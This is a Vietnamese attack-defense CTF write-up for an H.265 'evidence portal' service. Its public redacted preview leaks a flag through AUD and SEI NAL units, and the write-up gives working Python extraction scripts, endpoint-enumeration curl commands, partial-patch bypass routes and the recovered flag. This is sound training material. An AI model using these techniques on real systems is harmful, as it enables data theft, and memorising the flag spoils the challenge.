# H265 Evidence Portal AD - Writeup Attack

## Tổng Quan Lỗi

Service giả lập một cổng lưu trữ bằng chứng CCTV. Người dùng hợp lệ có `operator token` mới được đọc dữ liệu gốc qua các route riêng tư như `/api/read` hoặc `/api/carrier`.

Lỗi nằm ở file xem trước công khai:

```text
/api/cases/<case_id>/redacted-preview.h265
```

File này được gọi là preview đã che, nhưng backend vẫn giữ lại một số NAL phụ của H.265 từ file gốc. Trong H.265, NAL không chỉ có khung hình video. Nó còn có các phần phụ như AUD, SEI, VPS, SPS, PPS. Nếu đưa nhầm dữ liệu nhạy cảm vào các NAL phụ, rồi lại copy chúng sang preview công khai, người ngoài có thể tải preview và tách ngược cờ.

Trong bài này có nhiều hướng khai thác xoay quanh cùng một lỗi tổng quát:

```text
Preview công khai vẫn chứa metadata hoặc dấu vết nội bộ từ video gốc riêng tư.
```

Mục tiêu của attacker là lấy flag từ dữ liệu công khai, không cần token.

## Phân Loại Các Hướng Khai Thác

Không phải endpoint nào cũng trả flag trực tiếp. Trong bài này cần phân biệt rõ hai nhóm:

```text
Hướng lấy cờ trực tiếp:
- AUD NAL: bóc bit giấu trong NAL type 35.
- SEI NAL: bóc trace H5DBG trong NAL type 39/40.
- Preview cache cũ: tải lại preview lỗi cũ rồi vẫn bóc AUD/SEI.
- Route private sai phân quyền: chỉ xảy ra nếu /api/read hoặc /api/carrier bị hở token.

Hướng trinh sát lấy cờ gián tiếp:
- /api/cases
- /case/<id>
- /share/<share_id>
- /api/share/<share_id>/manifest.json
- /api/audit
- /api/preview-jobs
```

Các hướng trinh sát thường không chứa flag. Chúng có tác dụng tìm `case_id`, `preview_url`, `share_id`, trạng thái preview hoặc dấu vết cache. Sau đó attacker dùng thông tin này để quay lại khai thác AUD, SEI hoặc cache cũ.

Vì vậy câu đúng là:

```text
Trinh sát không tự giải ra cờ.
Trinh sát giúp tìm đúng file hoặc đúng case để khai thác lỗi còn sót.
```

## Dữ Liệu Cần Có

Trước khi khai thác cần có:

- địa chỉ service, ví dụ `http://127.0.0.1:8000`
- `case_id`
- file preview công khai `redacted-preview.h265`

Liệt kê các case công khai:

```powershell
curl.exe http://127.0.0.1:8000/api/cases
```

Ví dụ kết quả:

```json
{
  "ok": true,
  "items": [
    {
      "id": "flag_1780132060_da66f92c",
      "preview_url": "/api/cases/flag_1780132060_da66f92c/redacted-preview.h265",
      "source": "lobby_cam_01"
    }
  ]
}
```

Trong ví dụ trên:

```text
case_id = flag_1780132060_da66f92c
preview_url = /api/cases/flag_1780132060_da66f92c/redacted-preview.h265
```

Tải preview:

```powershell
curl.exe -L -o preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
```

Kiểm tra file có phải luồng H.265 hợp lệ không:

```powershell
ffprobe -v error -show_entries stream=codec_name,width,height -of default=noprint_wrappers=1 preview.h265
```

Kết quả mong đợi:

```text
codec_name=hevc
width=640
height=360
```

Nếu preview tải được và `ffprobe` đọc được `hevc`, bắt đầu thử các hướng bên dưới.

## Hướng 1 - Lấy Cờ Qua AUD NAL

### Khi Nào Dùng Được?

Dùng hướng này khi preview còn AUD NAL type `35`.

Kiểm tra nhanh:

```powershell
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print(sum(1 for n in find_nals(data) if nal_type(n)==35))"
```

Nếu số in ra lớn hơn `0`, preview vẫn còn AUD. Đây là dấu hiệu tốt cho hướng khai thác đầu tiên.

### Vì Sao Lấy Được Cờ?

AUD là viết tắt của Access Unit Delimiter. Bình thường AUD chỉ giúp đánh dấu ranh giới đơn vị truy cập trong luồng video. Ở bài này, service lạm dụng AUD để nhét bit của flag vào trường `primary_pic_type`.

Với mỗi AUD, attacker đọc bit như sau:

```python
primary_pic_type = (nal[2] >> 5) & 0x07
bit = primary_pic_type & 1
```

Flag không được ghi thẳng. Nó được đóng gói thành packet:

```text
H5AD || độ dài flag 2 byte || flag || crc32(flag)
```

Sau đó backend làm thêm ba việc để khiến việc đọc không quá lộ:

```text
packet -> chuyển thành bit -> XOR theo case_id -> mã Manchester -> chèn AUD giả
```

Nhưng `case_id` lại công khai trong `/api/cases`, nên attacker có thể sinh lại đúng nhịp AUD giả và dòng XOR để giải ngược.

### Cách Khai Thác Thủ Công

Các bước làm tay:

1. Tách toàn bộ NAL trong `preview.h265`.
2. Chỉ giữ NAL type `35`.
3. Với mỗi AUD, lấy bit thấp nhất của `primary_pic_type`.
4. Dùng `case_id` để bỏ qua các AUD giả.
5. Giải mã Manchester.
6. XOR ngược bằng dòng byte sinh từ `case_id`.
7. Ghép bit thành byte.
8. Tìm packet có magic `H5AD`.
9. Đọc độ dài flag và kiểm tra `crc32`.
10. In flag.

Đây là script thủ công cho riêng hướng AUD. Script này không dùng `solution/exploit.py`, chỉ tự tách NAL và tự giải mã:

```python
# aud_manual.py
from pathlib import Path
import hashlib
import struct
import zlib

# Thay case_id này bằng id lấy được từ /api/cases.
# File preview.h265 là file tải từ /api/cases/<case_id>/redacted-preview.h265.
case_id = "flag_1780132060_da66f92c"
data = Path("preview.h265").read_bytes()


def byte_stream(seed: str, label: bytes):
    # Sinh dòng byte giả ngẫu nhiên nhưng lặp lại được.
    # Backend cũng sinh theo công thức này, nên attacker chỉ cần biết case_id.
    counter = 0
    seed_bytes = seed.encode()
    while True:
        block = hashlib.sha256(label + seed_bytes + counter.to_bytes(4, "big")).digest()
        counter += 1
        for value in block:
            yield value


def find_nals(raw: bytes):
    # File .h265 dạng Annex-B chia NAL bằng start code:
    # 00 00 00 01 hoặc 00 00 01.
    # Hàm này tìm từng start code rồi cắt ra từng NAL.
    starts = []
    i = 0
    while i < len(raw) - 3:
        if raw[i:i + 4] == b"\x00\x00\x00\x01":
            starts.append((i, 4))
            i += 4
        elif raw[i:i + 3] == b"\x00\x00\x01":
            starts.append((i, 3))
            i += 3
        else:
            i += 1

    for idx, (start, size) in enumerate(starts):
        end = starts[idx + 1][0] if idx + 1 < len(starts) else len(raw)
        nal = raw[start + size:end]
        if nal:
            yield nal


def nal_type(nal: bytes) -> int:
    # Trong H.265, nal_unit_type nằm ở byte đầu tiên:
    # lấy 6 bit giữa bằng (nal[0] >> 1) & 0x3F.
    if len(nal) < 2:
        return -1
    return (nal[0] >> 1) & 0x3F


def bits_to_bytes(bits):
    # Ghép mỗi 8 bit thành 1 byte để khôi phục packet H5AD.
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        value = 0
        for bit in bits[i:i + 8]:
            value = (value << 1) | bit
        out.append(value)
    return bytes(out)


def manchester_decode(bits):
    # Backend mã Manchester để mỗi bit thật biến thành 2 bit:
    # 01 là 0, 10 là 1. Cặp khác nghĩa là dữ liệu sai hoặc bị thiếu.
    decoded = []
    for i in range(0, len(bits) - 1, 2):
        pair = bits[i:i + 2]
        if pair == [0, 1]:
            decoded.append(0)
        elif pair == [1, 0]:
            decoded.append(1)
        else:
            raise SystemExit(f"bad Manchester pair at bit {i}: {pair}")
    return decoded


def xor_bits(bits, seed: str):
    # Sau khi giải Manchester, bit vẫn bị XOR bằng dòng byte sinh từ case_id.
    # XOR lần nữa với cùng dòng byte sẽ lấy lại bit gốc.
    stream = byte_stream(seed, b"h265-ad-mask:")
    out = []
    current = 0
    remaining = 0
    for bit in bits:
        if remaining == 0:
            current = next(stream)
            remaining = 8
        remaining -= 1
        out.append(bit ^ ((current >> remaining) & 1))
    return out


aud_bits = []
for nal in find_nals(data):
    # AUD có nal_type = 35. Các NAL khác không chứa kênh giấu bit này.
    if nal_type(nal) != 35 or len(nal) < 3:
        continue
    # Bit bị giấu ở bit thấp nhất của primary_pic_type.
    primary_pic_type = (nal[2] >> 5) & 0x07
    aud_bits.append(primary_pic_type & 1)

print(f"AUD bit count: {len(aud_bits)}")

encoded_bits = []
pos = 0
cadence = byte_stream(case_id, b"h265-ad-cadence:")

while pos < len(aud_bits):
    # Backend chèn 1 đến 3 AUD giả trước mỗi bit thật.
    # Số AUD giả phụ thuộc case_id, nên ta sinh lại cadence để bỏ qua đúng nhịp.
    decoy_count = 1 + (next(cadence) % 3)

    for _ in range(decoy_count):
        if pos >= len(aud_bits):
            break
        next(cadence)
        pos += 1

    if pos >= len(aud_bits):
        break

    next(cadence)
    encoded_bits.append(aud_bits[pos])
    pos += 1

# Thứ tự giải ngược là:
# bỏ AUD giả -> giải Manchester -> XOR ngược -> ghép bit thành packet.
plain_bits = xor_bits(manchester_decode(encoded_bits), case_id)
header = bits_to_bytes(plain_bits[:48])

if header[:4] != b"H5AD":
    raise SystemExit("Không thấy packet H5AD. Sai case_id hoặc preview không còn AUD leak.")

# Packet có dạng: H5AD || size 2 byte || flag || crc32(flag).
size = struct.unpack(">H", header[4:6])[0]
packet = bits_to_bytes(plain_bits[:(10 + size) * 8])
flag = packet[6:6 + size]
crc_expected = struct.unpack(">I", packet[6 + size:10 + size])[0]
crc_actual = zlib.crc32(flag) & 0xFFFFFFFF

if crc_actual != crc_expected:
    # CRC giúp biết ta giải đúng chưa. Nếu CRC sai thì bit bị lệch hoặc sai case_id.
    raise SystemExit("CRC sai. Dữ liệu bị thiếu hoặc giải sai.")

print(flag.decode())
```

### Lệnh Khai Thác

Sau khi dùng đoạn code trên làm file `aud_manual.py`, chạy thủ công hướng AUD:

```powershell
python aud_manual.py
```

Kết quả thành công:

```text
AUD bit count: 2978
blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
```

Lệnh tự động tương đương:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
```

### Nếu Thất Bại Thì Hiểu Sao?

- Không còn AUD: defender đã xóa AUD type `35` khỏi preview.
- Không thấy `H5AD`: sai `case_id`, hoặc AUD không còn chứa packet hợp lệ.
- CRC sai: lấy thiếu bit, sai nhịp AUD giả, hoặc file preview đã bị làm sạch một phần.

Nếu hướng AUD thất bại, chuyển sang hướng SEI.

## Hướng 2 - Lấy Cờ Qua SEI NAL

### Khi Nào Dùng Được?

Dùng hướng này khi preview còn SEI NAL type `39` hoặc `40`.

Kiểm tra nhanh:

```powershell
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (39,40)})"
```

Nếu type `39` hoặc `40` lớn hơn `0`, preview vẫn còn SEI.

### Vì Sao Lấy Được Cờ?

SEI là vùng dữ liệu phụ trong H.265. Nó thường dùng để chứa thông tin bổ sung cho bộ giải mã, metadata, hoặc thông tin phụ do phần mềm thêm vào.

Trong bài này, backend để sót một trace gỡ lỗi trong SEI:

```text
H5DBG || độ dài 2 byte || packet đã XOR
```

`packet đã XOR` là packet chứa flag, nhưng bị XOR với dòng byte sinh từ `case_id` và nhãn:

```text
h265-ad-sei-trace:
```

Vì `case_id` công khai, attacker tạo lại dòng byte đó rồi XOR ngược để lấy packet thật.

### Cách Khai Thác Thủ Công

Các bước làm tay:

1. Tách toàn bộ NAL trong `preview.h265`.
2. Chỉ giữ NAL type `39` và `40`.
3. Bỏ 2 byte header NAL.
4. Tìm magic `H5DBG` trong payload.
5. Đọc 2 byte độ dài ngay sau `H5DBG`.
6. Lấy đúng số byte dữ liệu đã bị XOR.
7. Sinh dòng byte từ `case_id` với nhãn `h265-ad-sei-trace:`.
8. XOR ngược để lấy packet thật.
9. Parse packet `H5AD`.
10. Kiểm tra `crc32`.
11. In flag.

Đây là script thủ công cho riêng hướng SEI. Script này cũng không dùng `solution/exploit.py`:

```python
# sei_manual.py
from pathlib import Path
import hashlib
import struct
import zlib

# Thay case_id này bằng id lấy được từ /api/cases.
# File preview.h265 là file tải từ /api/cases/<case_id>/redacted-preview.h265.
case_id = "flag_1780132060_da66f92c"
data = Path("preview.h265").read_bytes()


def byte_stream(seed: str, label: bytes):
    # Sinh dòng byte dùng để XOR ngược payload trong SEI.
    # Chỉ cần cùng case_id và cùng label là sinh ra đúng dòng byte backend đã dùng.
    counter = 0
    seed_bytes = seed.encode()
    while True:
        block = hashlib.sha256(label + seed_bytes + counter.to_bytes(4, "big")).digest()
        counter += 1
        for value in block:
            yield value


def xor_bytes(raw: bytes, seed: str, label: bytes):
    # Payload SEI bị che bằng XOR. XOR lại lần nữa bằng cùng dòng byte sẽ ra packet thật.
    stream = byte_stream(seed, label)
    return bytes(value ^ next(stream) for value in raw)


def find_nals(raw: bytes):
    # Tách file .h265 dạng Annex-B thành từng NAL dựa trên start code.
    starts = []
    i = 0
    while i < len(raw) - 3:
        if raw[i:i + 4] == b"\x00\x00\x00\x01":
            starts.append((i, 4))
            i += 4
        elif raw[i:i + 3] == b"\x00\x00\x01":
            starts.append((i, 3))
            i += 3
        else:
            i += 1

    for idx, (start, size) in enumerate(starts):
        end = starts[idx + 1][0] if idx + 1 < len(starts) else len(raw)
        nal = raw[start + size:end]
        if nal:
            yield nal


def nal_type(nal: bytes) -> int:
    # Lấy loại NAL của H.265. SEI thường nằm ở type 39 hoặc 40.
    if len(nal) < 2:
        return -1
    return (nal[0] >> 1) & 0x3F


for nal in find_nals(data):
    # Chỉ quan tâm SEI prefix/suffix.
    if nal_type(nal) not in (39, 40):
        continue

    # Bỏ 2 byte header NAL để đọc phần payload bên trong.
    payload = nal[2:]

    # H5DBG là dấu hiệu trace gỡ lỗi bị sót trong preview.
    pos = payload.find(b"H5DBG")
    if pos < 0:
        continue

    # Sau H5DBG là 2 byte độ dài của packet đã bị XOR.
    size_pos = pos + len(b"H5DBG")
    size = struct.unpack(">H", payload[size_pos:size_pos + 2])[0]
    start = size_pos + 2
    masked_packet = payload[start:start + size]

    if len(masked_packet) != size:
        continue

    # Giải XOR bằng label riêng của kênh SEI.
    packet = xor_bytes(masked_packet, case_id, b"h265-ad-sei-trace:")

    # Packet thật phải bắt đầu bằng magic H5AD.
    if packet[:4] != b"H5AD":
        continue

    # Packet có dạng: H5AD || size 2 byte || flag || crc32(flag).
    flag_size = struct.unpack(">H", packet[4:6])[0]
    flag = packet[6:6 + flag_size]
    crc_expected = struct.unpack(">I", packet[6 + flag_size:10 + flag_size])[0]
    crc_actual = zlib.crc32(flag) & 0xFFFFFFFF

    if crc_actual != crc_expected:
        # CRC sai nghĩa là packet vừa giải không phải flag hợp lệ.
        raise SystemExit("CRC sai. SEI có trace nhưng packet không hợp lệ.")

    print(flag.decode())
    break
else:
    raise SystemExit("Không tìm thấy SEI trace H5DBG.")
```

### Lệnh Khai Thác

Sau khi dùng đoạn code trên làm file `sei_manual.py`, chạy thủ công hướng SEI:

```powershell
python sei_manual.py
```

Kết quả thành công:

```text
blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
```

Lệnh tự động tương đương:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
```

### Khi Nào Hướng Này Hữu Ích?

Hướng SEI rất hữu ích khi defender chỉ vá kiểu:

```text
xóa AUD type 35
```

Nếu SEI vẫn còn trong preview, attacker vẫn lấy được flag. Đây là ví dụ của việc vá theo dấu hiệu cụ thể nhưng chưa vá đúng lỗi tổng quát.

## Hướng 3 - Lấy Cờ Từ Preview Cache Cũ

### Khi Nào Dùng Được?

Dùng hướng này sau khi defender đã vá code nhưng service vẫn trả file preview cũ.

Điều kiện:

- preview lỗi đã được render trước khi vá
- file cũ vẫn nằm trong cache
- backend thấy file có sẵn thì trả luôn, không tạo lại bản sạch

### Vì Sao Lấy Được Cờ?

Preview cũ là file đã sinh bởi code lỗi. Dù source hiện tại đã vá, file cũ vẫn có thể chứa AUD hoặc SEI leak.

Luồng khai thác:

```text
trước khi vá: service tạo preview lỗi
sau khi vá: file lỗi vẫn còn trong cache
attacker tải lại preview
attacker giải AUD hoặc SEI trên file cũ
```

### Cách Khai Thác

Tải lại preview:

```powershell
curl.exe -L -o stale_preview.h265 http://127.0.0.1:8000/api/cases/flag_1780132060_da66f92c/redacted-preview.h265
```

Kiểm tra file cũ còn AUD hoặc SEI không:

```powershell
python -c "from pathlib import Path; import sys; sys.path.insert(0,'solution'); from exploit import find_nals,nal_type; data=Path('stale_preview.h265').read_bytes(); print({t:sum(1 for n in find_nals(data) if nal_type(n)==t) for t in (35,39,40)})"
```

Nếu còn type `35`, `39` hoặc `40`, dùng lại script thủ công ở hướng AUD hoặc SEI. Với bản tự động:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
```

Điểm quan trọng của hướng này là attacker không cần tìm bug mới. Attacker chỉ tận dụng file public cũ mà service vẫn trả.

## Hướng 4 - Trinh Sát Qua Share Và Manifest

### Khi Nào Dùng?

Dùng khi `/api/cases` bị ẩn hoặc không trả đủ thông tin.

Thử các đường dẫn:

```text
/share/<share_id>
/api/share/<share_id>/manifest.json
```

### Có Thể Lấy Được Gì?

Các endpoint này có thể làm lộ:

- `case_id`
- `preview_url`
- nguồn camera
- codec
- thời điểm tạo preview
- loại artifact public

### Cách Dùng Để Lấy Cờ Gián Tiếp

Share và manifest **không phải nơi chứa flag trực tiếp**. Chúng chỉ nguy hiểm khi defender đã vá một phần, ví dụ ẩn `/api/cases`, nhưng lại quên rằng share/manifest vẫn làm lộ `case_id` và `preview_url`.

Chuỗi khai thác khi vá thiếu:

1. Mở share hoặc manifest.
2. Tìm `case_id`.
3. Tìm `preview_url`.
4. Tải preview.
5. Kiểm tra AUD type `35`.
6. Nếu có AUD, dùng hướng 1.
7. Nếu AUD không còn, kiểm tra SEI type `39` hoặc `40`.
8. Nếu có SEI, dùng hướng 2.
9. Nếu cả hai đều không có, kiểm tra hướng cache cũ.

Ví dụ defender chỉ vá `/api/cases`:

```text
/api/cases bị ẩn
-> attacker tìm được /share/<share_id>
-> manifest vẫn lộ case_id và preview_url
-> attacker tải redacted-preview.h265
-> preview vẫn còn AUD hoặc SEI
-> lấy được flag
```

Kết luận cho hướng này:

```text
Share/manifest không lấy cờ một mình.
Share/manifest lấy cờ gián tiếp nếu chúng còn dẫn tới preview đang hở AUD/SEI hoặc cache cũ.
```

## Hướng 5 - Trinh Sát Qua Nhật Ký Và Hàng Đợi Preview

### Khi Nào Dùng?

Dùng để tìm case mới, case vừa được checker đặt flag, hoặc preview vừa render xong.

Thử:

```powershell
curl.exe http://127.0.0.1:8000/api/audit
curl.exe http://127.0.0.1:8000/api/preview-jobs
```

### Có Thể Tận Dụng Gì?

Nếu public, các endpoint này có thể làm lộ:

- case nào vừa được import
- case nào vừa có flag mới
- preview nào đã render xong
- preview nào đang nằm trong cache
- thời điểm nên tải lại preview

### Cách Dùng Để Lấy Cờ Gián Tiếp

Audit và preview-jobs cũng **không phải nơi chứa flag trực tiếp**. Điểm nguy hiểm là chúng có thể làm lộ case nào vừa được checker đặt flag, case nào vừa render preview, hoặc preview nào đang có trong cache.

1. Xem audit để tìm sự kiện tạo case.
2. Lấy `case_id` mới.
3. Xem hàng đợi preview để biết preview đã `ready` chưa.
4. Khi preview sẵn sàng, tải file `.h265`.
5. Thử hướng AUD.
6. Nếu AUD fail, thử hướng SEI.

Ví dụ defender đã ẩn `/api/cases`, nhưng quên để `/api/audit` public:

```text
/api/cases không còn liệt kê case
-> /api/audit vẫn lộ case_id mới
-> /api/preview-jobs cho biết preview đã ready
-> attacker tự dựng URL /api/cases/<case_id>/redacted-preview.h265
-> tải preview
-> nếu preview còn AUD/SEI hoặc cache cũ, lấy được flag
```

Kết luận cho hướng này:

```text
Audit/preview-jobs là hướng chọn mục tiêu.
Chúng chỉ giúp lấy cờ gián tiếp khi preview hoặc cache vẫn còn lỗi thật.
```

## Hướng 6 - Kiểm Tra Lỗi Phân Quyền Ở Route Riêng Tư

### Khi Nào Dùng?

Luôn nên thử nhanh trước khi phân tích H.265 sâu.

Hai route riêng tư:

```text
POST /api/read
POST /api/carrier
```

Đáng ra phải yêu cầu token đúng.

### Cách Thử

Thử đọc với token sai:

```powershell
curl.exe -X POST http://127.0.0.1:8000/api/read `
  -H "Content-Type: application/json" `
  -d "{\"id\":\"flag_1780132060_da66f92c\",\"token\":\"wrong-token\"}"
```

Kết quả đúng là bị từ chối.

Nếu token sai mà server vẫn trả marker hoặc carrier gốc, đó là lỗi phân quyền trực tiếp. Khi đó không cần khai thác AUD hoặc SEI nữa.

Trong bản hiện tại, route riêng tư đã kiểm tra token. Vì vậy hướng chính vẫn là preview công khai.

## Sau Khi Defender Vá Một Phần Thì Hướng Nào Còn Dùng Được?

Bảng này giúp đọc bài theo đúng kiểu attack-defense: attacker không chỉ thử một đường, mà thử đường còn hở sau khi defender vá thiếu.

| Defender vá gì? | Hướng còn có thể lấy cờ gián tiếp |
| --- | --- |
| Ẩn `/api/cases` | Dùng share/manifest/audit để tìm `case_id`, rồi khai thác AUD/SEI. |
| Xóa AUD type `35` | Nếu SEI type `39/40` còn `H5DBG`, dùng hướng SEI. |
| Xóa SEI type `39/40` | Nếu AUD type `35` còn bit giấu, dùng hướng AUD. |
| Vá code tạo preview mới | Nếu cache cũ chưa xóa hoặc chưa đổi version cache, tải preview cũ rồi khai thác AUD/SEI. |
| Ẩn audit và preview-jobs | Vẫn có thể lấy `case_id` qua `/api/cases`, share hoặc manifest nếu các endpoint đó còn public. |
| Vá `/api/read` và `/api/carrier` | Chỉ chặn đường private. Nếu preview public còn leak thì attacker vẫn lấy cờ. |

Nói gọn:

```text
Các endpoint trinh sát chỉ là đường tìm mục tiêu.
Muốn ra flag, cuối cùng vẫn cần một lỗi thật còn sống: AUD leak, SEI leak, cache cũ, hoặc private route hở.
```

## Khai Thác Tự Động

Sau khi hiểu cách làm tay, có thể dùng script tự động có sẵn để tiết kiệm thời gian.

Nếu đã biết `case_id`:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector auto
```

Nếu chưa biết `case_id`, script sẽ gọi `/api/cases` để lấy danh sách:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --vector auto
```

Chạy riêng từng hướng:

```powershell
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector aud
python solution/exploit.py http://127.0.0.1:8000 --id flag_1780132060_da66f92c --vector sei
```

Cách đọc kết quả:

- `aud` thành công: preview còn AUD leak.
- `aud` thất bại nhưng `sei` thành công: defender chỉ vá AUD, SEI vẫn hở.
- cả hai thất bại nhưng file cũ còn AUD/SEI: lỗi nằm ở cache.
- cả hai thất bại và preview không còn AUD/SEI: đường preview đã được làm sạch tốt hơn.
- các endpoint trinh sát còn public nhưng AUD/SEI/cache đều sạch: chưa đủ để lấy flag.

## Kết Luận

Bài này không phải lỗi lấy flag bằng một endpoint trả thẳng flag. Attacker cần đi theo chuỗi:

```text
tìm case_id -> tải preview công khai -> phân tích NAL -> tách metadata bị sót -> giải ngược packet -> lấy flag
```

Các hướng khai thác khác nhau nhưng cùng nhắm vào một bản chất: preview công khai không được làm sạch triệt để trước khi trả cho người ngoài.
